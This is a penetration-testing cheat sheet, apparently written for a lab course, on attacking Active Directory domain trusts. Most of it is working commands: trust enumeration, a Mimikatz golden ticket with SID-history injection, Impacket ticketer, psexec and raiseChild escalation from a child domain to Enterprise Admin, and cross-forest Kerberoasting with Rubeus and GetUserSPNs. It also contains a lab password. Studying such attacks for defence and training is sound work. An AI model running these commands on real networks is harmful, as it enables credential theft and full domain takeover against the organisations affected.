# Domain Trust Attacks
**Concept:** Active Directory uses "Trusts" to allow users in one domain to access resources in another. 
**The Vulnerability:**
1. **Child -> Parent:** Trusts within the same Forest are transitive. If you compromise a Child Domain Admin, you can abuse **SID History** to forge a ticket claiming to be an **Enterprise Admin** in the parent domain. 
2. **Cross-Forest:** Trusts between different forests (e.g., after a company merger). These usually have SID Filtering enabled, so we look for **Kerberoastable users** or **Foreign Group Memberships**.
## 1. Enumeration (Mapping the Trusts)
**Goal:** Identify adjacent domains and the type of trust (Parent-Child, External, Forest).
### From Windows (PowerView / Native)
```powershell
# Native PowerShell (RSAT)
Import-Module activedirectory
Get-ADTrust -Filter *

# PowerView (Detailed Mapping)
Get-DomainTrust
Get-DomainTrustMapping

# Native CMD (Netdom)
netdom query /domain:inlanefreight.local trust
```
### From Linux (BloodHound)
BloodHound is the best tool for visualizing trusts.
```shell
# -c All collects Trust data automatically
bloodhound-python -d INLANEFREIGHT.LOCAL -c All -u user -p password
```
## 2. Attack: Child -> Parent (SID History Injection)
**Scenario:** You are **Domain Admin** in a Child Domain (`LOGISTICS`). You want to become **Enterprise Admin** in the Parent Domain (`INLANEFREIGHT`). 
**Mechanism:** The "Golden Ticket" attack. We create a TGT for our Child Domain, but we inject the **SID of the Enterprise Admins group** into the `SID History` field. The Parent Domain trusts this field and grants us access.
### Prerequisites
1. **Child `krbtgt` Hash:** Dumped via DCSync on the Child DC. 
2. **Child Domain SID:** The ID of the domain we own.
3. **Parent Enterprise Admin SID:** The ID of the target group we want to spoof.
### Step 1: Gather SIDs (Windows)
```powershell
# 1. Get Child Domain SID
Get-DomainSID

# 2. Get Parent Enterprise Admin SID
# We query the parent domain for the group "Enterprise Admins"
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
```
### Step 2: Execute (Windows - Mimikatz)
```powershell
# Mimikatz Golden Ticket with SID History
# /sid: Child Domain SID
# /sids: Parent Enterprise Admin SID (The Injection)
# /krbtgt: Child KRBTGT NTLM Hash
mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-CHILD /sids:S-1-5-21-PARENT-519 /krbtgt:9d76... /ptt
```
### Step 2: Execute (Linux - Impacket)
**Tool:** `ticketer.py` or `raiseChild.py` (Automated).

**Manual Method (Ticketer):**
```shell
# Create the CCache file
# -extra-sid: The Parent Enterprise Admin SID
ticketer.py -nthash <KRBTGT_HASH> -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid <CHILD_SID> -extra-sid <PARENT_EA_SID> hacker

# Load the ticket
export KRB5CCNAME=hacker.ccache

# Psexec to Parent DC
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@parent-dc.inlanefreight.local -k -no-pass
```

**Automated Method (RaiseChild):** This script automates the entire process: dumps the child hash, maps the parent, creates the ticket, and Psexecs.
```shell
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```
## 3. Attack: Cross-Forest (Kerberoasting & Foreign Groups)
**Scenario:** Two separate forests trust each other (e.g., `FREIGHTLOGISTICS` trusts `INLANEFREIGHT`). 
**Constraint:** **SID Filtering** is usually active, meaning the "SID History" attack above _will not work_. 
**Strategy:** We look for:
1. **Cross-Forest Kerberoasting:** Can we roast a user in the other domain?
2. **Foreign Membership:** Is a user from _our_ domain a member of a group in the _other_ domain?
### Cross-Forest Kerberoasting
We can request Service Tickets (TGS) for users in the trusted domain and crack them.

**From Windows (Rubeus):**
```powershell
# /domain: The target foreign domain
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```

**From Linux (GetUserSPNs):**
```shell
# -target-domain: The foreign domain
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```
### Foreign Group Hunting (BloodHound)
We check if any groups in the Foreign Domain contain users from our Current Domain.

**1. Data Collection:** You must run BloodHound against _both_ domains.
```shell
# Update resolv.conf to point to Foreign DC
echo "nameserver 172.16.5.240" > /etc/resolv.conf

# Ingest Foreign Domain data using OUR credentials (trust allows this)
bloodhound-python -d FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
```

**2. Analysis:**
- Import data into BloodHound. 
- Query: `Find Foreign Group Membership`.
- Look for edges where `INLANEFREIGHT` users are members of `FREIGHTLOGISTICS` local admin groups.